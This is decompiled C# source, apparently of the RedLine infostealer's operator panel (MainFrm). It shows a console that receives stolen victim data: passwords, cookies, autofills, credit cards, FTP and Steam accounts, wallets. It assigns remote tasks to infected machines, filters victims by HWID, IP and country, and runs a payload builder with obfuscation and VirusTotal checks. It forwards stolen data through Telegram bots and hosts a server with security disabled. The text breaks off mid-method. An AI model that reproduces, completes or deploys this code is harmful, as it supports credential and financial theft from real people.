using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel;
using System.ServiceModel.Description;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using GuiLib;
using MetroSet_UI.Components;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic;
using Pluralsight.Crypto;
using RedLine.MainPanel.Data;
using RedLine.MainPanel.Data.Controllers;
using RedLine.MainPanel.Data.Extensions;
using RedLine.MainPanel.Data.Files;
using RedLine.MainPanel.Data.Helpers;
using RedLine.MainPanel.Data.UI;
using RedLine.MainPanel.DbControllers;
using RedLine.MainPanel.LogExt;
using RedLine.MainPanel.Models;
using RedLine.MainPanel.Models.BTC;
using RedLine.MainPanel.Properties;
using RedLine.MainPanel.Views.Settings;
using RedLine.SharedModels;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Helpers;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;

namespace RedLine.MainPanel.Views.Old.Actions;

public class MainFrm : Form
{
	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass49_0
	{
		public FolderSelectDialog folderBrowser;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass50_0
	{
		public string comment;

		public MainFrm _003C_003E4__this;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass50_1
	{
		public int selectedItem;

		public _003C_003Ec__DisplayClass50_0 CS_0024_003C_003E8__locals1;

		internal bool method_0(UserLog x)
		{
			return x.ID == selectedItem;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass50_2
	{
		public UserLog userLog;

		public _003C_003Ec__DisplayClass50_1 CS_0024_003C_003E8__locals2;

		internal void method_0()
		{
			try
			{
				userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(CS_0024_003C_003E8__locals2.selectedItem);
				userLog.Comment = CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.comment;
				LazyLoader<UserLogsDb>.Instance.Save(userLog);
			}
			catch (Exception ex)
			{
				MessageBox.Show(CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this, "Error item: " + ex.ToString());
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass57_0
	{
		public string filter;

		public string finalPoint;

		public string target;

		public bool visible;

		public string domainsCheck;

		public MainFrm _003C_003E4__this;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass57_1
	{
		public RemoteTaskAction parsedAction;

		public _003C_003Ec__DisplayClass57_0 CS_0024_003C_003E8__locals1;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass57_2
	{
		public RemoteTaskStatus parsedStatus;

		public _003C_003Ec__DisplayClass57_1 CS_0024_003C_003E8__locals2;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass57_3
	{
		public RemoteTask task;

		public int selectedItem;

		public _003C_003Ec__DisplayClass57_2 CS_0024_003C_003E8__locals3;

		internal void method_0()
		{
			try
			{
				task = LazyLoader<TasksDb>.Instance.LoadBody(selectedItem);
				task.Action = CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.parsedAction;
				task.Filter = CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.filter;
				task.FinalPoint = CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.finalPoint;
				task.Status = CS_0024_003C_003E8__locals3.parsedStatus;
				task.Target = CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.target;
				task.Visible = CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.visible;
				task.DomainsCheck = CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.domainsCheck;
				LazyLoader<TasksDb>.Instance.Save(task);
			}
			catch (Exception ex)
			{
				MessageBox.Show(CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this, "Error: " + ex.ToString());
			}
		}

		internal void method_1()
		{
			LazyLoader<TasksDb>.Instance.DbInstance[LazyLoader<TasksDb>.Instance.FindIndex((RemoteTask x) => x.ID == task.ID)] = task;
			CS_0024_003C_003E8__locals3.CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1._003C_003E4__this.UpdateTasks();
		}

		internal bool method_2(RemoteTask x)
		{
			return x.ID == task.ID;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass115_0
	{
		public string filePath;

		public FileInfo fileInfo;

		public MainFrm _003C_003E4__this;

		internal void method_0()
		{
			try
			{
				_003C_003Ec__DisplayClass115_1 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass115_1
				{
					CS_0024_003C_003E8__locals1 = this,
					ofd = new OpenFileDialog()
				};
				try
				{
					CS_0024_003C_003E8__locals0.ofd.Filter = "All files (*.*)|*.*";
					CS_0024_003C_003E8__locals0.ofd.CheckPathExists = true;
					CS_0024_003C_003E8__locals0.ofd.InitialDirectory = Directory.GetCurrentDirectory();
					CS_0024_003C_003E8__locals0.ofd.RestoreDirectory = true;
					CS_0024_003C_003E8__locals0.ofd.Multiselect = false;
					_003C_003E4__this.Invoke((MethodInvoker)delegate
					{
						if (CS_0024_003C_003E8__locals0.ofd.ShowDialog(CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals1._003C_003E4__this) == DialogResult.OK)
						{
							CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals1.filePath = CS_0024_003C_003E8__locals0.ofd.FileName;
						}
					});
				}
				finally
				{
					if (CS_0024_003C_003E8__locals0.ofd != null)
					{
						((IDisposable)CS_0024_003C_003E8__locals0.ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(_003C_003E4__this, "Error: " + ex.Message);
			}
		}

		internal bool method_1(GuestFile x)
		{
			return x.Filename == fileInfo.Name;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass115_1
	{
		public OpenFileDialog ofd;

		public _003C_003Ec__DisplayClass115_0 CS_0024_003C_003E8__locals1;

		internal void method_0()
		{
			if (ofd.ShowDialog(CS_0024_003C_003E8__locals1._003C_003E4__this) == DialogResult.OK)
			{
				CS_0024_003C_003E8__locals1.filePath = ofd.FileName;
			}
		}
	}

	public static PanelSettings RemoteClientSettings = new PanelSettings();

	[CompilerGenerated]
	private object object_0 = "30";

	private IntPtr intptr_0;

	private object object_1 = new object();

	private static object object_2 = new Dictionary<string, Action<Update>>();

	private object object_3;

	private object object_4;

	private object object_5 = new BindingList<UserLog>();

	private object object_6 = string.Empty;

	private object object_7 = new object();

	private object a = new object();

	public static object settingsLock = new object();

	private object c = new object();

	private object m_d = new object();

	private object m_e;

	private object m_f = new Queue<string>();

	private object object_8 = new StatisticDb();

	private IntPtr intptr_1;

	public bool ScanVT;

	private object object_9;

	private object panel1;

	private object dashboardTabs;

	private object notificationTab;

	private object statisticTab;

	private object logsTab;

	private object settingsTab;

	private object builderTab;

	private object contactsTab;

	private object topHeader;

	private object tasksTab;

	private object closeBtn;

	private object mainTitle;

	private object object_10;

	private object logsListView;

	private object notificationTb;

	private object logContextMenu;

	private object viewersToolStripMenuItem;

	private object passwordsToolStripMenuItem;

	private object cookiesToolStripMenuItem;

	private object autofillsToolStripMenuItem;

	private object creditCardsToolStripMenuItem;

	private object sorterTab;

	private object saveToolStripMenuItem;

	private object label1;

	private object commentTb;

	private object clearBtn;

	private object saveBtn;

	private object setCommentBtn;

	private object systemInfoToolStripMenuItem;

	private object metroSetDivider1;

	private object passwordsCounter;

	private object ftpLbl;

	private object ftpsCounter;

	private object metroSetDivider6;

	private object filesLbl;

	private object filesCounter;

	private object metroSetDivider5;

	private object cardsLbl;

	private object creditcardsCounter;

	private object metroSetDivider4;

	private object autofillsLbl;

	private object autofillsCounter;

	private object metroSetDivider3;

	private object cookiesLbl;

	private object cookiesCounter;

	private object metroSetDivider2;

	private object passwordsLbl;

	private object metroSetDivider7;

	private object metroSetDivider8;

	private object top10osLb;

	private object top10osLbl;

	private object top10CountriesLb;

	private object top10countryLbl;

	private object tasksDgv;

	private object object_11;

	private object iDDataGridViewTextBoxColumn1;

	private object targetDataGridViewTextBoxColumn;

	private object actionDataGridViewTextBoxColumn;

	private object finalPointDataGridViewTextBoxColumn;

	private object currentDataGridViewTextBoxColumn;

	private object statusDataGridViewTextBoxColumn;

	private object filterDataGridViewTextBoxColumn;

	private object visibleDataGridViewCheckBoxColumn;

	private object newTaskFilter;

	private object newTaskFinal;

	private object newTaskTarget;

	private object currentTaskStatusLbl;

	private object editTaskVisible;

	private object editTaskVisibleLbl;

	private object editTaskFilterLbl;

	private object newTaskFilterLbl;

	private object editTaskFinalLbl;

	private object saveTaskBtn;

	private object editTaskTargetLbl;

	private object editTaskActionLbl;

	private object metroSetDivider9;

	private object newTaskFinalLbl;

	private object addTaskBtn;

	private object newTaskTargetLbl;

	private object newTaskActionLbl;

	private object editTaskFinal;

	private object editTaskTarget;

	private object editTaskAction;

	private object newTaskAction;

	private object currentTaskStatus;

	private object editTaskFilter;

	private object updateTaskBtn;

	private object grabBrowsersLbl;

	private object grabBrowsersCb;

	private object grabFtpsLbl;

	private object grabFtpsCb;

	private object grabImClientsLbl;

	private object grabImClientsCb;

	private object grabFilesLbl;

	private object grabFilesCb;

	private object getFilesSettingsLbl;

	private object getFilesSettingsLb;

	private object addSearchPatternBtn;

	private object searchPatternTb;

	private object searchPatternLbl;

	private object saveSettingsBtn;

	private object metroSetDivider10;

	private object blackListCms_2;

	private object deleteToolStripMenuItem;

	private object blackListCms_3;

	private object toolStripMenuItem1;

	private object duplicateLbl;

	private object duplicateCb;

	private object deleteAllBtn;

	private object fTPToolStripMenuItem;

	private object filesToolStripMenuItem;

	private object telegramLinkBtn;

	private object pictureBox1;

	private object label2;

	private object singleStatusLbl;

	private object metroSetLabel1;

	private object label11;

	private object singleCommentSortTb;

	private object label10;

	private object singleIdSortTb;

	private object label9;

	private object label8;

	private object singleCountrySortTb;

	private object singleSort;

	private object singleCookieSortTb;

	private object label12;

	private object metroSetDivider12;

	private object singlePasswordSortTb;

	private object singleFilesSortCb;

	private object label16;

	private object singleFtpsSortCb;

	private object label15;

	private object singleAfSortCb;

	private object label14;

	private object singleCCsSortCb;

	private object label13;

	private object singleOsSortTb;

	private object label17;

	private object sortDomain;

	private object domainsTb;

	private object m_a0;

	private object m_a1;

	private object m_a2;

	private object m_a3;

	private object m_a4;

	private object m_a5;

	private object m_a6;

	private object m_a7;

	private object m_a8;

	private object m_a9;

	private object m_aa;

	private object m_ab;

	private object m_ac;

	private object m_ad;

	private object m_ae;

	private object af;

	private object b0;

	private object b1;

	private object b2;

	private object b3;

	private object b4;

	private object b5;

	private object b6;

	private object b7;

	private object b8;

	private object b9;

	private object ba;

	private object bb;

	private object bc;

	private object bd;

	private object be;

	private object bf;

	private object c0;

	private object c1;

	private object c2;

	private object c3;

	private object c4;

	private object c5;

	private object c6;

	private object c7;

	private object c8;

	private object c9;

	private object ca;

	private object cb;

	private object cc;

	private object cd;

	private object ce;

	private object cf;

	private object d0;

	private object d1;

	private object d2;

	private object d3;

	private object d4;

	private object d5;

	private object d6;

	private object d7;

	private object d8;

	private object d9;

	private object da;

	private object db;

	private object dc;

	private object dd;

	private object de;

	private object df;

	private object e0;

	private object e1;

	private object e2;

	private object e3;

	private object e4;

	private object e5;

	private object e6;

	private object e7;

	private object e8;

	private object e9;

	private object ea;

	private object eb;

	private object ec;

	private object ed;

	private object ee;

	private object ef;

	private object f0;

	private object f1;

	private object f2;

	private object f3;

	private object f4;

	private object f5;

	private object f6;

	private object f7;

	private object f8;

	private object f9;

	private object fa;

	private object fb;

	private object fc;

	private object fd;

	private object fe;

	private object ff;

	private object expiresTimeDataGridViewTextBoxColumn;

	private object object_12;

	private object guestExpireDate;

	private object label34;

	private object guestBuildID;

	private object label33;

	private object addGuest;

	private object blackListCms_5;

	private object toolStripMenuItem4;

	private object singleSkipCheckedSortCb;

	private object label35;

	private object checkConnectionBtn;

	private object metroSetDivider16;

	private object label36;

	private object createDirectFileBtn;

	private object guestFilesDgv;

	private object changeMd5Cb;

	private object object_13;

	private object blackListCms_4;

	private object toolStripMenuItem5;

	private object object_14;

	private object object_15;

	private object trayCms;

	private object showToolStripMenuItem;

	private object exitToolStripMenuItem;

	private object lockBtn;

	private object toolStripMenuItem6;

	private object steamLbl;

	private object steamCb;

	private object vpnLbl;

	private object vpnCb;

	private object domainDetectorLb;

	private object screenshotLbl;

	private object screenshotCb;

	private object telegramLbl;

	private object telegramCb;

	private object blockIptoolStripMenuItem;

	private object editToolStripMenuItem;

	private object toolStripMenuItem7;

	private object logDateFromDTP;

	private object logDateToDTP;

	private object backPageBtn;

	private object nextPageBtn;

	private object pageNumberTb;

	private object goToPageBtn;

	private object currentPage;

	private object currentPageLbl;

	private object totalPages;

	private object totalPagesLbl;

	private object totalLogs;

	private object label38;

	private object openWalletBtn;

	private object walletPath;

	private object label7;

	private object metroSetDivider17;

	private object top10AvsLb;

	private object metroSetLabel6;

	private object metroSetDivider18;

	private object chooseAutosaveDirectory;

	private object autosaveDirTb;

	private object label40;

	private object removeCheckedLogsBtn;

	private object removeEmptyLogsBtn;

	private object singleRefreshDomainDetectSortCb;

	private object label32;

	private object showDomainDetects;

	private object object_16;

	private object saveFtpAccountsBtn;

	private object fileNamesToSearchTb;

	private object label41;

	private object steamFilesCb;

	private object label39;

	private object findTgCb;

	private object label37;

	private object dataFormatSavingTb;

	private object label42;

	private object blackListsTab;

	private object metroSetDivider11;

	private object metroSetButton2;

	private object importHWIDs;

	private object addBlackHwidBtn;

	private object blackHwidTb;

	private object label43;

	private object blackListHWIDsLb;

	private object label44;

	private object importIPs;

	private object addBlackIPBtn;

	private object blackIPTb;

	private object label23;

	private object blackListIPsLb;

	private object label24;

	private object addBlackCountryBtn;

	private object blackCountryTb;

	private object blackCountryLbl;

	private object blackListLb;

	private object blackListLbl;

	private object blockHwidtoolStripMenuItem8;

	private object virusTotalTextbox;

	private object metroSetButton3;

	private object virusTotalKey;

	private object label47;

	private object openVirusTotalFile;

	private object virustotalFile;

	private object label48;

	private object metroSetDivider19;

	private object blackListCms_6;

	private object toolStripMenuItem8;

	private object label45;

	private object discordCb;

	private object proSignButton;

	private object errorMessageTb;

	private object label46;

	private object totalSelectedLogs;

	private object label50;

	private object object_17;

	private object iDDataGridViewTextBoxColumn;

	private object hWIDDataGridViewTextBoxColumn;

	private object iPDataGridViewTextBoxColumn;

	private object buildIDDataGridViewTextBoxColumn;

	private object usernameDataGridViewTextBoxColumn;

	private object isProcessElevatedDataGridViewCheckBoxColumn;

	private object currentLanguageDataGridViewTextBoxColumn;

	private object monitorSizeDataGridViewTextBoxColumn;

	private object logDateDataGridViewTextBoxColumn;

	private object uacTypeDataGridViewTextBoxColumn;

	private object countryDataGridViewTextBoxColumn;

	private object SeenBefore;

	private object Checked;

	private object locationDataGridViewTextBoxColumn;

	private object timeZoneDataGridViewTextBoxColumn;

	private object screenshotDataGridViewImageColumn;

	private object Comment;

	private object Creds;

	private object pDDDataGridViewTextBoxColumn;

	private object cDDDataGridViewTextBoxColumn;

	private object Credentials;

	private object configRecipientIdBtn;

	private object removeRecipientIdBtn;

	private object recipientsIdsListBox;

	private object label51;

	private object saveDiscordTokensBtn;

	private object addRecipientIdBtn;

	private object addIdBlackListBtn;

	private object removeIdBlackListBtn;

	private object blackListChatIds;

	private object label49;

	private object importCountries;

	private object importBuilds;

	private object addBlackBuildBtn;

	private object blackBuildIdTb;

	private object label52;

	private object blackListBuildsLb;

	private object blackListCms_7;

	private object toolStripMenuItem9;

	private object label53;

	private object cookiesMoreThan;

	private object label54;

	private object passMoreThan;

	private object label55;

	private object metroSetDivider20;

	private object activeConnections;

	private object label56;

	private object partnersTab;

	private object partnerPoster6;

	private object partnerPoster5;

	private object partnerPoster4;

	private object partnerPoster3;

	private object partnerPoster2;

	private object partnerPoster1;

	private object autoStartTelegramCb;

	private object label57;

	private object sendLogByPartsCb;

	private object label58;

	private object metroSetButton4;

	private object obfuscateCheckBox;

	private object label59;

	private object loadConfigBtn;

	private object saveConfigBtn;

	private object iDDataGridViewTextBoxColumn3;

	private object filenameDataGridViewTextBoxColumn;

	private object changeMd5DataGridViewCheckBoxColumn;

	private object restoreTab;

	private object label29;

	private object freshCookiesTb;

	private object refreshCookiesBtn;

	private object accessTokenTb;

	private object refreshCookiesLbl;

	public string Version
	{
		[CompilerGenerated]
		get
		{
			return (string)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	public MainFrm()
	{
		InitializeComponent();
		InitCommands();
		this.AllowDraggBy((Control)topHeader);
		_ = ((Control)logsListView).Handle;
		_ = base.Handle;
		Login();
		RemoteClientSettings.LoadSettings();
		method_1(logsListView, 1u);
		RedLineService.Args = new ServiceArgs(ReciveClient, OnGetSettings, OnGetTasks, CompleteTask, (string header, string buildId) => true);
		PageController<UserLog> pageController = LazyLoader<UserLogsDb>.Instance.PageController;
		pageController.OnPageChanged = (ChangePageEventHandler)Delegate.Combine(pageController.OnPageChanged, (ChangePageEventHandler)delegate(uint page)
		{
			int page = (int)page;
			if (page >= 0 && page < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
			{
				Invoke((MethodInvoker)delegate
				{
					((Control)currentPage).Text = (page + 1).ToString();
					((DataGridView)logsListView).DataSource = LazyLoader<UserLogsDb>.Instance.PageController.Pages[page];
				});
			}
		});
		System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
		timer.Interval = 5000;
		timer.Enabled = true;
		timer.Tick += delegate
		{
			ProcessNotifies();
		};
		timer.Start();
		System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
		timer2.Interval = 1000;
		timer2.Enabled = true;
		timer2.Tick += delegate
		{
			lock (RedlineEvents.Counter)
			{
				((Control)activeConnections).Text = RedlineEvents.Counter.ToString();
				RedlineEvents.Counter = 0;
			}
		};
		timer2.Start();
		PageController<UserLog> pageController2 = LazyLoader<UserLogsDb>.Instance.PageController;
		pageController2.OnCountChanged = (ItemsCountChangedEventHandler)Delegate.Combine(pageController2.OnCountChanged, (ItemsCountChangedEventHandler)delegate(uint count)
		{
			int count = (int)count;
			try
			{
				if (count < LazyLoader<UserLogsDb>.Instance.PageController.PageSize)
				{
					LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = 1;
				}
				else
				{
					LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = count / LazyLoader<UserLogsDb>.Instance.PageController.PageSize + 1;
				}
				lock (object_1)
				{
					if (!base.InvokeRequired)
					{
						((Control)totalLogs).Text = count.ToString();
						((Control)totalPages).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
					}
					else
					{
						Invoke((MethodInvoker)delegate
						{
							((Control)totalLogs).Text = count.ToString();
							((Control)totalPages).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
						});
					}
				}
			}
			catch
			{
			}
		});
		object[] items2;
		try
		{
			ListBox.ObjectCollection items = ((ListBox)blackListChatIds).Items;
			items2 = System.IO.File.ReadAllLines("blackListChats.ini");
			items.AddRange(items2);
		}
		catch
		{
		}
		((StatisticDb)object_8).LoadSettings();
		this.m_e = new TelegramChatsDb();
		((TelegramChatsDb)this.m_e).LoadSettings();
		object obj2 = this.m_e;
		List<TelegramChatSettings> chatsSettings = ((TelegramChatsDb)this.m_e).chatsSettings;
		object obj3;
		if (chatsSettings == null)
		{
			obj3 = null;
		}
		else
		{
			IEnumerable<TelegramChatSettings> enumerable = chatsSettings.Take(CountOfChats());
			if (enumerable == null)
			{
				obj3 = null;
			}
			else
			{
				obj3 = enumerable.ToList();
				if (obj3 != null)
				{
					goto IL_024e;
				}
			}
		}
		obj3 = new List<TelegramChatSettings>();
		goto IL_024e;
		IL_024e:
		((TelegramChatsDb)obj2).chatsSettings = (List<TelegramChatSettings>)obj3;
		((TelegramChatsDb)this.m_e).SaveSettings();
		ListBox.ObjectCollection items3 = ((ListBox)recipientsIdsListBox).Items;
		IEnumerable<string> enumerable2 = ((TelegramChatsDb)this.m_e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
		object obj4;
		if (enumerable2 == null)
		{
			obj4 = null;
		}
		else
		{
			obj4 = enumerable2.ToArray();
			if (obj4 != null)
			{
				goto IL_02ae;
			}
		}
		obj4 = new string[0];
		goto IL_02ae;
		IL_02ae:
		items2 = (object[])obj4;
		items3.AddRange(items2);
		object_3 = new ServiceSettings();
		((ServiceSettings)object_3).LoadSettings();
		LoadSettings();
		if (RemoteClientSettings.AutoStart && !string.IsNullOrWhiteSpace(RemoteClientSettings.TelegramBotToken))
		{
			method_6();
		}
		UpdateStat();
		UpdateTasks();
		Uri uriHttps = new Uri(string.Format("net.tcp://{0}:{1}", "0.0.0.0", ((ServiceSettings)object_3).Port));
		NetTcpBinding binding = new NetTcpBinding
		{
			MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromMinutes(30.0),
			OpenTimeout = TimeSpan.FromMinutes(30.0),
			ReceiveTimeout = TimeSpan.FromMinutes(30.0),
			SendTimeout = TimeSpan.FromMinutes(30.0),
			TransferMode = TransferMode.Buffered,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 44567654,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new NetTcpSecurity
			{
				Mode = SecurityMode.None,
				Message = new MessageSecurityOverTcp
				{
					ClientCredentialType = MessageCredentialType.None
				}
			}
		};
		RedlineEvents.Domain = ((ServiceSettings)object_3).Port == 80 || ((ServiceSettings)object_3).Port == 81;
		((AnimaTextBox)this.m_a6).Text = SettingsOfPanel.Default.ServerIP;
		((DataGridView)fd).DataSource = LazyLoader<GuestLinksDb>.Instance.DbInstance;
		((DataGridView)guestFilesDgv).DataSource = LazyLoader<GuestFilesDb>.Instance.DbInstance;
		Task.Run(delegate
		{
			try
			{
				GuestHttpServer guestHttpServer = new GuestHttpServer(20);
				AddNotify("GuestHttpServer is starting");
				guestHttpServer.ProcessRequest += method_2;
				guestHttpServer.Start("+", ((ServiceSettings)object_3).GuestPort);
				AddNotify("GuestHttpServer is running");
			}
			catch (Exception arg)
			{
				AddNotify($"GuestHttpServer error: {arg}");
			}
		});
		Task.Run((Func<Task>)delegate
		{
			/*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/;
		});
		Task.Run((Func<Task>)delegate
		{
			/*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/;
		});
		Task.Run((Func<Task>)delegate
		{
			while (true)
			{
				try
				{
					lock (a)
					{
						((StatisticDb)object_8).SaveSettings();
					}
				}
				catch (Exception)
				{
				}
				Task.Delay(TimeSpan.FromSeconds(30.0)).Wait();
			}
		});
		((DateTimePicker)logDateFromDTP).CustomFormat = "dd.MM.yyyy HH:mm";
		((DateTimePicker)logDateToDTP).CustomFormat = "dd.MM.yyyy HH:mm";
		((DateTimePicker)logDateFromDTP).Value = new DateTime(2000, 1, 1);
		((DateTimePicker)logDateToDTP).Value = new DateTime(2030, 1, 1);
		((Control)totalLogs).Text = LazyLoader<UserLogsDb>.Instance.DbInstance.Count.ToString();
		if (LazyLoader<UserLogsDb>.Instance.DbInstance.Count < LazyLoader<UserLogsDb>.Instance.PageController.PageSize)
		{
			LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = 1;
		}
		else
		{
			LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = LazyLoader<UserLogsDb>.Instance.DbInstance.Count / LazyLoader<UserLogsDb>.Instance.PageController.PageSize + 1;
		}
		((Control)totalPages).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
		LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
		method_0();
		Task.Run(delegate
		{
			bool flag = true;
			Task.Delay(TimeSpan.FromSeconds(5.0)).Wait();
			while (true)
			{
				try
				{
					if (flag)
					{
						AddNotify("Server is starting");
					}
					ServiceHost serviceHost = new ServiceHost(typeof(RedLineService), uriHttps);
					serviceHost.AddServiceEndpoint(typeof(IRemoteEndpoint), binding, "");
					ServiceDebugBehavior serviceDebugBehavior = serviceHost.Description.Behaviors.Find<ServiceDebugBehavior>();
					if (serviceDebugBehavior == null)
					{
						serviceHost.Description.Behaviors.Add(new ServiceDebugBehavior
						{
							HttpHelpPageEnabled = false,
							HttpsHelpPageEnabled = false,
							IncludeExceptionDetailInFaults = true
						});
					}
					else
					{
						serviceDebugBehavior.HttpHelpPageEnabled = false;
						serviceDebugBehavior.HttpsHelpPageEnabled = false;
						serviceDebugBehavior.IncludeExceptionDetailInFaults = true;
					}
					ServiceThrottlingBehavior serviceThrottlingBehavior = serviceHost.Description.Behaviors.Find<ServiceThrottlingBehavior>();
					if (serviceThrottlingBehavior != null)
					{
						serviceThrottlingBehavior.MaxConcurrentCalls = int.MaxValue;
						serviceThrottlingBehavior.MaxConcurrentInstances = int.MaxValue;
						serviceThrottlingBehavior.MaxConcurrentSessions = int.MaxValue;
					}
					else
					{
						serviceHost.Description.Behaviors.Add(new ServiceThrottlingBehavior
						{
							MaxConcurrentCalls = int.MaxValue,
							MaxConcurrentInstances = int.MaxValue,
							MaxConcurrentSessions = int.MaxValue
						});
					}
					serviceHost.Open();
					if (flag)
					{
						AddNotify("Server is running on " + ((ServiceSettings)object_3).Port);
						flag = false;
					}
					Task.Delay(TimeSpan.FromMinutes(30.0)).Wait();
					if (serviceHost.State != CommunicationState.Faulted)
					{
						serviceHost.Close();
						using (serviceHost)
						{
						}
					}
					else
					{
						serviceHost.Abort();
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(this, "Unable to start server, error: " + ex);
					AddNotify($"Server error: {ex}");
					Task.Delay(TimeSpan.FromMinutes(1.0)).Wait();
				}
			}
		});
		_ = from x in AppDomain.CurrentDomain.GetAssemblies()
			select x.FullName;
		base.Size = new Size(1366, 674);
	}

	private object method_0()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		SelfSignedCertProperties val = new SelfSignedCertProperties
		{
			Name = new X500DistinguishedName("CN=localhost"),
			ValidFrom = DateTime.Now.AddDays(-7.0),
			ValidTo = DateTime.Now.AddYears(5),
			KeyBitLength = 512,
			IsPrivateKeyExportable = true
		};
		CryptContext val2 = new CryptContext();
		try
		{
			val2.Open();
			return val2.CreateSelfSignedCertificate(val);
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public int CountOfChats()
	{
		return ProfileSettings.Login switch
		{
			"FHEKF893fh824fh" => 11, 
			"olipmik" => 10, 
			"qz740" => 10, 
			_ => 5, 
		};
	}

	private void method_1(object c, uint value)
	{
		PropertyInfo property = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty);
		if (property != null)
		{
			property.SetValue(c, (byte)value != 0, null);
			MethodInfo method = typeof(Control).GetMethod("SetStyle", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.InvokeMethod);
			if (method != null)
			{
				method.Invoke(c, new object[2]
				{
					ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer,
					true
				});
			}
			method = typeof(Control).GetMethod("UpdateStyles", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.InvokeMethod);
			if (method != null)
			{
				method.Invoke(c, null);
			}
		}
	}

	public void Login()
	{
		new SplashFrm().ShowDialog(this);
	}

	private void method_2(object listenerObj)
	{
		try
		{
			HttpListenerContext httpListenerContext = listenerObj as HttpListenerContext;
			HttpListenerRequest request = httpListenerContext.Request;
			if (request.QueryString.HasKey("id"))
			{
				string guestLinkId = request.QueryString.GetValue("id");
				GuestLink[] source = LazyLoader<GuestLinksDb>.Instance.DbInstance.ToArray();
				if (source.Any((GuestLink x) => x.ID == guestLinkId))
				{
					GuestLink currentGuestLink = source.First((GuestLink x) => x.ID == guestLinkId);
					bool flag = true;
					if (string.IsNullOrWhiteSpace(currentGuestLink.ExpiresTime) || (!string.IsNullOrWhiteSpace(currentGuestLink.ExpiresTime) && DateTime.TryParseExact(currentGuestLink.ExpiresTime, "dd.MM.yyyy HH:mm", null, DateTimeStyles.None, out var result) && ((result >= DateTime.Now) ? true : false)))
					{
						lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
						{
